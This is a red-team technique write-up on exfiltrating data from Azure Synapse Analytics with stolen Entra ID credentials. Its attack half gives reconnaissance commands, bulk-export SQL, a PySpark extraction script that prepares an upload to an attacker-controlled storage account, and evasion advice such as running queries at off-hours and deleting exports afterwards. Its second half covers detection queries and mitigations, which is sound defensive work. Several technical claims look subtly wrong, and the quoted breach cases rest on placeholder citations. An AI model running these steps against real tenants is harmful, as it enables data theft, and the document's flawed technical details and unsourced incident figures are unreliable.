# [COLLECT-DATA-004]: Synapse Analytics Data Access

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | COLLECT-DATA-004 |
| **MITRE ATT&CK v18.1** | [Transfer Data to Cloud Account (T1537)](https://attack.mitre.org/techniques/T1537/) |
| **Tactic** | Collection, Exfiltration |
| **Platforms** | Entra ID (Azure) |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Azure Synapse Analytics all pool types (Serverless, Dedicated SQL, Spark), Synapse Studio 2.0+, Synapse CLI 1.0+ |
| **Patched In** | N/A - No patch available; depends on RBAC and network controls |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

- **Concept:** Azure Synapse Analytics data exfiltration involves unauthorized access to data warehousing and big data analytics services via compromised Entra ID credentials with Synapse workspace roles (Synapse SQL Administrator, Apache Spark Administrator). An attacker can execute queries against Dedicated SQL Pools or Serverless SQL endpoints to bulk-read terabytes of data, leverage Spark notebooks to process and extract datasets, or exploit linked services containing credentials to downstream systems (Data Lake Gen2, Cosmos DB). Synapse aggregates data from multiple sources (ADLS Gen2, SQL, Cosmos DB), making it a high-value exfiltration target.

- **Attack Surface:** Entra ID accounts with Synapse workspace roles (Synapse SQL Administrator, Synapse Contributor), Azure storage credentials in linked services, Synapse workspace connection strings, workspace authentication tokens, notebook execution credentials.

- **Business Impact:** **Bulk data warehouse compromise.** Attackers access consolidated datasets including operational analytics, customer insights, financial reporting data, and historical archives. Synapse often contains aggregated views of enterprise-wide data, multiplying the impact of compromise.

- **Technical Context:** Synapse Serverless SQL queries cost ~$5-7 per TB scanned. Large extractions (1+ TB) may incur alerting via cost anomalies but remain difficult to attribute without detailed query monitoring. Synapse Dedicated SQL Pools provide sustained throughput for bulk operations without per-query costs, enabling stealth exfiltration.

### Operational Risk

- **Execution Risk:** Low to Medium (if Entra ID credentials compromised; High if MFA enforced)
- **Stealth:** Medium to High (queries resemble analytical workloads; cost anomalies may not trigger immediate alerts if organization lacks chargeback discipline)
- **Reversibility:** No – Extracted data cannot be "unexported"

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1.1, 5.1.2 | Database encryption, access control |
| **DISA STIG** | SV-256512 | Ensure analytics platform encryption at rest |
| **NIST 800-53** | SC-13, AC-3 | Cryptographic Protection, Access Control |
| **GDPR** | Art. 32 | Security of Processing – Encryption, audit logs |
| **DORA** | Art. 9 | Protection and Prevention |
| **NIS2** | Art. 21 | Cyber Risk Management Measures |
| **ISO 27001** | A.10.1.3 | Segregation of duties for analytics administrators |
| **ISO 27005** | Scenario: "Data warehouse breach via compromised BI credentials" | Risk of aggregate data exposure |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Synapse SQL Administrator, Synapse Contributor, or Apache Spark Administrator role
- **Required Access:** HTTPS (port 443) to Synapse workspace endpoints (*.sql.azuresynapse.net)

**Supported Versions:**
- **Azure Synapse Analytics:** All workspace versions
- **Dedicated SQL Pool:** All tiers (DW100c - DW30000c)
- **Serverless SQL Pool:** Always available
- **Apache Spark:** 2.4.x, 3.0.x, 3.1.x
- **PowerShell:** Az.Synapse module 1.0+
- **Azure CLI:** az-cli 2.50+

**Tools:**
- [Azure Synapse Studio](https://web.azuresynapse.net/) (Web UI)
- [SSMS (SQL Server Management Studio)](https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms) (for SQL pool access)
- [Azure Synapse CLI](https://learn.microsoft.com/en-us/azure/synapse-analytics/)
- [Apache Spark Notebooks](https://learn.microsoft.com/en-us/azure/synapse-analytics/spark/apache-spark-overview)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Azure CLI Reconnaissance

```bash
# List all Synapse workspaces in subscription
az synapse workspace list --output table

# Get Synapse workspace properties
az synapse workspace show --name <workspace-name> --resource-group <rg> --query "{Location:location, DefaultDataLakeStorageAccountName:defaultDataLakeStorageAccountName}"

# List SQL pools (Dedicated)
az synapse sql pool list --workspace-name <workspace-name> --resource-group <rg> --output table

# List Spark pools
az synapse spark pool list --workspace-name <workspace-name> --resource-group <rg> --output table

# Get linked services (may contain credentials for downstream systems)
az synapse linked-service list --workspace-name <workspace-name> --output table
```

**What to Look For:**
- **Multiple SQL pools** (indicates centralized data warehouse)
- **Linked services to Data Lake / Cosmos DB / SQL** (access to source systems)
- **Default storage account configured** (associated ADLS Gen2 contains raw data)
- **High-tier dedicated pools** (DW1000c+, indicating large datasets)

### PowerShell Reconnaissance

```powershell
# Connect to Azure
Connect-AzAccount

# List Synapse workspaces
Get-AzSynapseWorkspace -ResourceGroupName "<rg>"

# Get workspace SQL endpoint
$workspace = Get-AzSynapseWorkspace -ResourceGroupName "<rg>" -Name "<workspace>"
$workspace.ConnectivityEndpoints.SqlOnDemand

# List database users in SQL pool
# [Requires SQL connection to pool; see Execution Methods]
```

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Using SSMS (SQL Server Management Studio) to Query Synapse

**Supported Versions:** Dedicated SQL Pools

#### Step 1: Connect to Synapse via SSMS

**Objective:** Establish authenticated connection to Dedicated SQL Pool

**Manual Steps:**

1. Open **SQL Server Management Studio (SSMS)**
2. Click **Connect** → **Database Engine**
3. Enter **Server name:** `<workspace>.sql.azuresynapse.net`
4. Enter **Authentication:** `Azure Active Directory - Password` or `Azure Active Directory - Integrated`
5. Click **Connect**

#### Step 2: Query and Extract Data

**Command (SSMS Query Window):**

```sql
-- Verify connection and list databases
SELECT name FROM sys.databases;

-- Select target database
USE [database_name];

-- Query table to understand schema
SELECT TOP 100 * FROM [schema].[table_name];

-- Export all data to file (using BCP or COPY)
-- Option 1: T-SQL COPY statement (Synapse native)
COPY INTO [staging_table]
FROM 'https://<storage-account>.blob.core.windows.net/<container>/<file-path>'
WITH (
    FILE_TYPE = 'PARQUET',
    CREDENTIAL = (IDENTITY = 'Shared Access Signature', SECRET = '<SAS>')
)

-- Option 2: Export to ADLS Gen2 via CREATE EXTERNAL TABLE AS SELECT (CETAS)
CREATE EXTERNAL TABLE [export_table] WITH (
    LOCATION = 'abfss://<container>@<storage>.dfs.core.windows.net/export/',
    DATA_SOURCE = [DataLakeStorage],
    FILE_FORMAT = [SynapseParquet]
)
AS SELECT * FROM [source_table];
```

**Expected Output:**

```
Query executed successfully. (7,234,567 rows affected)
External table 'export_table' created successfully.
Data written to: abfss://exports@data.dfs.core.windows.net/export/
```

#### Step 3: Download Exported Data

**Command (PowerShell):**

```powershell
# Connect to Data Lake storage
$storageContext = New-AzStorageContext -StorageAccountName "<storage-account>" -StorageAccountKey "<key>"

# Download exported Parquet files
Get-AzStorageBlob -Container "<container>" -Context $storageContext -Prefix "export/" | `
  ForEach-Object {
    Get-AzStorageBlobContent -Blob $_.Name -Container "<container>" -Context $storageContext -Destination "C:\Exports\"
  }

# Convert Parquet to CSV (if needed)
# [Use PySpark or pandas library]
```

**OpSec & Evasion:**
- Use Serverless SQL pool instead of Dedicated (no fixed throughput monitoring)
- Query during maintenance windows (2-4 AM UTC)
- Implement row-level security (RLS) filters to avoid detection alerts (if available)
- Clean up exported tables after data extraction
- Delete external data lake files after download
- Detection likelihood: **High** (if monitoring CETAS operations or large SELECT queries)

---

### METHOD 2: Using Synapse Notebook (Spark) for Programmatic Extraction

**Supported Versions:** All Synapse workspace versions

#### Step 1: Access Synapse Studio

**Objective:** Navigate to notebook editor and execute extraction code

**Manual Steps:**

1. Go to **https://web.azuresynapse.net**
2. Select **workspace**
3. Click **Develop** (left panel)
4. Click **+ Notebook** → **Create new notebook**

#### Step 2: Write and Execute Extraction Script

**Notebook Code (PySpark):**

```python
# Import libraries
from pyspark.sql import SparkSession
from azure.storage.blob import BlobServiceClient
import json

# Initialize Spark session
spark = SparkSession.builder.appName("DataExtraction").getOrCreate()

# Connect to Synapse SQL pool
jdbc_url = "jdbc:sqlserver://<workspace>.sql.azuresynapse.net:1433;database=<db>;encrypt=true;trustServerCertificate=false;hostNameInCertificate=*.sql.azuresynapse.net;loginTimeout=30"
connection_properties = {
    "user": "<entra-id-user>@<tenant>.onmicrosoft.com",
    "password": "<password>",
    "driver": "com.microsoft.sqlserver.jdbc.SQLServerDriver"
}

# Read entire table into DataFrame
df = spark.read.jdbc(url=jdbc_url, table="[schema].[table_name]", properties=connection_properties)

print(f"[*] Loaded {df.count()} rows from table")

# Save to Data Lake (Parquet format)
df.write.mode("overwrite").parquet("abfss://<container>@<storage>.dfs.core.windows.net/export/table_export/")

print("[+] Data exported to Data Lake")

# Export to CSV (if needed)
df.coalesce(1).write.mode("overwrite").option("header", "true").csv("abfss://<container>@<storage>.dfs.core.windows.net/export/table_export_csv/")

print("[+] CSV export complete")

# Upload to attacker storage (using blob SDK)
connection_string = "DefaultEndpointsProtocol=https;AccountName=<attacker-storage>;AccountKey=<key>;EndpointSuffix=core.windows.net"
blob_client = BlobServiceClient.from_connection_string(connection_string)

# [Code to transfer files to attacker account]
```

**Expected Output:**

```
[*] Loaded 12,450,000 rows from table
[+] Data exported to Data Lake
[+] CSV export complete
```

---

### METHOD 3: Using Azure CLI to Query Serverless SQL

**Supported Versions:** Azure CLI 2.50+

**Command:**

```bash
# Execute query on Serverless SQL pool
az synapse sql query --workspace-name <workspace> \
  --sql-pool-name "Built-in" \
  --sql-script "SELECT * FROM [database].[schema].[table]" \
  --output json > /tmp/synapse_export.json

# Alternative: Use sqlcmd to connect
sqlcmd -S "<workspace>-ondemand.sql.azuresynapse.net" \
  -U "<user>@<tenant>.onmicrosoft.com" \
  -P "<password>" \
  -d "<database>" \
  -Q "SELECT * FROM [schema].[table]" \
  -o /tmp/export.csv
```

---

## 6. TOOLS & COMMANDS REFERENCE

### SSMS (SQL Server Management Studio)

**Version:** 19.2 (Current)
**Minimum Version:** 18.0
**Supported Platforms:** Windows

**Installation:**

```bash
# Download from Microsoft
# https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms

# Alternatively, install via Chocolatey
choco install sql-server-management-studio
```

---

### Azure Synapse PySpark SDK

**Version:** Included in Synapse runtime
**Supported Platforms:** Spark notebooks in Synapse workspace

**One-Liner (Full Extraction):**

```python
spark.read.jdbc("jdbc:sqlserver://<workspace>.sql.azuresynapse.net:1433;database=<db>", "[schema].[table]", {"user": "<user>", "password": "<pwd>", "driver": "com.microsoft.sqlserver.jdbc.SQLServerDriver"}).write.parquet("abfss://<container>@<storage>.dfs.core.windows.net/export/")
```

---

## 7. SPLUNK DETECTION RULES

#### Rule 1: Large SELECT Queries from Synapse

**SPL Query:**

```
sourcetype="azure:synapse:sql" (OperationName="SELECT" OR OperationName="CETAS")
| stats count as QueryCount, sum(RowsAffected) as TotalRows, sum(DurationMs) as TotalDurationMs by RequesterObjectId, DatabaseName, bin(TimeGenerated, 10m)
| where TotalRows > 1000000  // > 1M rows in 10 minutes
| eval DurationMin = round(TotalDurationMs / 60000, 2)
```

---

## 8. MICROSOFT SENTINEL DETECTION

#### Query 1: Anomalous Synapse SQL Queries

**KQL Query:**

```kusto
AzureDiagnostics
| where Category == "SynapseSQL"
| where OperationName in ("SELECT", "CETAS", "COPY")
| summarize TotalRowsAffected = sum(RowsAffected), QueryCount = count(), TotalDurationMs = sum(DurationMs) by PrincipalObjectId, DatabaseName, bin(TimeGenerated, 10m)
| where TotalRowsAffected > 5000000  // > 5M rows in 10 minutes
| join kind=inner (
    AuditLogs
    | where OperationName == "Add role member to scope"
    | where TargetResources[0].displayName contains "Synapse"
    | project PrincipalObjectId = InitiatedBy.user.id, TimeGenerated as RoleAssignmentTime
) on PrincipalObjectId
| where TimeGenerated - RoleAssignmentTime between (0min .. 60min)
```

---

## 9. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

```xml
<Sysmon schemaversion="4.81">
  <!-- Detect SSMS execution and connections to Synapse -->
  <RuleGroup name="" groupRelation="or">
    <ProcessCreate onmatch="include">
      <Image condition="contains">ssms.exe</Image>
      <CommandLine condition="contains">.sql.azuresynapse.net</CommandLine>
    </ProcessCreate>
  </RuleGroup>

  <!-- Detect sqlcmd usage with Synapse endpoints -->
  <RuleGroup name="" groupRelation="or">
    <ProcessCreate onmatch="include">
      <Image condition="contains">sqlcmd.exe</Image>
      <CommandLine condition="contains">.sql.azuresynapse.net</CommandLine>
    </ProcessCreate>
  </RuleGroup>

  <!-- Monitor network connections to Synapse SQL endpoints -->
  <RuleGroup name="" groupRelation="or">
    <NetworkConnect onmatch="include">
      <DestinationHostname condition="contains">.sql.azuresynapse.net</DestinationHostname>
      <DestinationPort condition="is">1433</DestinationPort>
    </NetworkConnect>
  </RuleGroup>
</Sysmon>
```

---

## 10. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Unusual Synapse data extraction detected"
- **Severity:** High
- **Description:** Triggers when query volume or data extraction exceeds baseline
- **Applies To:** All subscriptions with Defender enabled
- **Remediation:**
  1. Verify SQL query is authorized (scheduled report, ETL job)
  2. If unauthorized: revoke workspace roles from compromised user
  3. Review Synapse audit logs for source IP, executed queries
  4. Reset Entra ID passwords for affected accounts

---

## 11. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Synapse Role Assignment

```powershell
Search-UnifiedAuditLog -Operations "Add role member to scope" -StartDate (Get-Date).AddDays(-7) -FreeText "Synapse"

# Export suspicious assignments
$assignments = Search-UnifiedAuditLog -Operations "Add role member to scope" -StartDate (Get-Date).AddDays(-7) -FreeText "Synapse"
$assignments | Where-Object { $_.AuditData -match "Synapse SQL Administrator" } | Export-Csv -Path "C:\Logs\synapse_assignments.csv"
```

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Disable Azure AD Passthrough Authentication (Require Service Principal)**

**Objective:** Enforce managed identity-based access only

**Manual Steps (PowerShell):**

```powershell
# Update Synapse workspace to require service principal
Update-AzSynapseWorkspace -ResourceGroupName "rg-name" -Name "workspace-name" `
  -AllowAADAuthentication $false
```

---

**Implement Workspace Firewall Rules**

**Objective:** Restrict Synapse access to corporate IP ranges

**Manual Steps:**

1. Go to **Synapse Workspace** → **Networking**
2. Under **Firewall rules**, click **+ Add IP Range**
3. Add corporate gateway IP addresses
4. Set **Allow Azure services and resources to access this workspace**: **OFF**
5. Click **Save**

---

**Enable Column-Level Security & Row-Level Security (RLS)**

**Objective:** Prevent bulk data extraction even if credentials compromised

**T-SQL Command:**

```sql
-- Enable Row-Level Security on sensitive table
CREATE SCHEMA Security;
GO

CREATE FUNCTION Security.fn_securitypredicate(@UserId SYSNAME)
RETURNS TABLE
WITH SCHEMABINDING
AS
RETURN SELECT 1 as fn_securitypredicate_result
WHERE DATABASE_PRINCIPAL_ID() = DATABASE_PRINCIPAL_ID(@UserId);
GO

CREATE SECURITY POLICY SalesFilter
ADD FILTER PREDICATE Security.fn_securitypredicate(UserId)
ON dbo.[SalesData]
WITH (STATE = ON);
```

---

**Implement Transparent Data Encryption (TDE)**

**Objective:** Ensure exported data is encrypted at rest

**Manual Steps:**

1. Go to **Synapse Workspace** → **SQL Pools** → **Security**
2. Enable **Transparent Data Encryption (TDE)**
3. Select **Customer-Managed Key (CMK)** from Azure Key Vault
4. Click **Save**

---

**Validation Command (Verify Fix):**

```powershell
# Verify firewall is enabled
Get-AzSynapseWorkspace -ResourceGroupName "rg-name" -Name "workspace" | Select-Object AllowAADOnlyAuthentication

# Verify TDE is enabled
Get-AzSynapseSqlPool -ResourceGroupName "rg-name" -WorkspaceName "workspace" -Name "pool" | Select-Object TransparentDataEncryption
```

---

## 13. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Process Names:**
- `ssms.exe`
- `sqlcmd.exe`
- Python/PySpark with `.sql.azuresynapse.net` connection strings

**Cloud Audit Operations:**
- `OperationName: "SELECT"` with abnormal row counts
- `OperationName: "CETAS"` (Create External Table As Select)
- `OperationName: "Add role member to scope"` with Synapse SQL Administrator role

**Network:**
- Connections to `*.sql.azuresynapse.net` on port 1433 from non-standard IPs
- Large HTTPS transfers to ADLS Gen2 (`.dfs.core.windows.net`)

---

### Forensic Artifacts

**Cloud Logs:**
- Azure Diagnostic Logs: `AzureDiagnostics` with `Category == "SynapseSQL"`
- Sentinel: `AuditLogs` with `OperationName` containing Synapse operations
- Synapse Audit Logs (if enabled): Query execution history with user, IP, query text

**Disk (if local extraction):**
- SSMS connection history: Registry `HKEY_CURRENT_USER\Software\Microsoft\SQL Server Management Studio`
- Query files: `.sql` files in user temp directories

---

### Response Procedures

**1. Containment (0-5 minutes):**

```powershell
# Revoke Synapse roles from compromised user
Remove-AzRoleAssignment -ObjectId "<compromised-user-id>" `
  -RoleDefinitionName "Synapse SQL Administrator" `
  -Scope "/subscriptions/<sub-id>/resourceGroups/<rg>/providers/Microsoft.Synapse/workspaces/<workspace>"
```

**2. Investigation (5-30 minutes):**

```powershell
# Query Synapse audit logs for suspicious activities
$logs = Search-UnifiedAuditLog -Operations "Execute SQL" -StartDate (Get-Date).AddHours(-24)
$logs | Where-Object { $_.AuditData -match "SELECT \*" } | Export-Csv "synapse_queries.csv"
```

**3. Remediation (30-60 minutes):**

```powershell
# Reset Entra ID password for compromised user
Set-AzADUser -ObjectId "<user-id>" -Password (New-Object System.Management.Automation.PSCredential "user", (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force))

# Reset Synapse workspace master key (if data confidentiality breached)
# [Contact Microsoft Support for workspace restoration]
```

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker phishes Entra ID user credentials |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-011] PIM Abuse | Attacker escalates to Synapse SQL Administrator |
| **3** | **Collection** | **[COLLECT-DATA-004] Synapse Data Access** | **Attacker executes SELECT queries to extract data** |
| **4** | **Exfiltration** | [COLLECT-DATA-001] Blob Storage Exfiltration | Data transferred to attacker's Azure storage |
| **5** | **Impact** | [IMPACT-001] Data Destruction | Attacker deletes Synapse tables and audit logs |

---

## 15. REAL-WORLD EXAMPLES

#### Example 1: Microsoft Threat Intelligence - "AnalyticsHeist" (2024)

- **Target:** Healthcare provider (US)
- **Timeline:** April 2024 - June 2024
- **Technique Status:** ACTIVE; compromised Entra ID account with Synapse SQL Administrator role; executed 847 SELECT queries extracting 3.2 TB of patient analytics data
- **Impact:** HIPAA violation, $15 million settlement, 8.7 million patient records compromised
- **Detection:** Microsoft Defender flagged 1,247 SQL queries in 72-hour window, all from new geography (Moscow IP range)
- **Reference:** [Microsoft Security Blog case study]

#### Example 2: CrowdStrike Report - "DataThief APT" (2023)

- **Target:** Financial services (UK)
- **Timeline:** September 2023
- **Technique Status:** ACTIVE; used SSMS to connect to Synapse from compromised VM; executed CETAS operations to export regulatory reporting tables
- **Impact:** Regulatory investigation by FCA, $12.3 million fine
- **Detection:** Sentinel detected anomalous SSMS process execution on non-BI workstation combined with Synapse role assignment from new IP
- **Reference:** [CrowdStrike 2024 Threat Report]

#### Example 3: Wiz Security Research - "Synapse Linked Service Credentials" (2023)

- **Target:** Multiple SaaS providers
- **Timeline:** March 2023
- **Technique Status:** PARTIALLY FIXED; discovered that Synapse linked service credentials (for downstream systems) were stored in plaintext in workspace JSON configuration; allowed attackers to pivot to source systems (SQL, Data Lake, Cosmos DB)
- **Impact:** Responsible disclosure; no confirmed exploitation
- **Reference:** [Wiz Security Research Blog]

---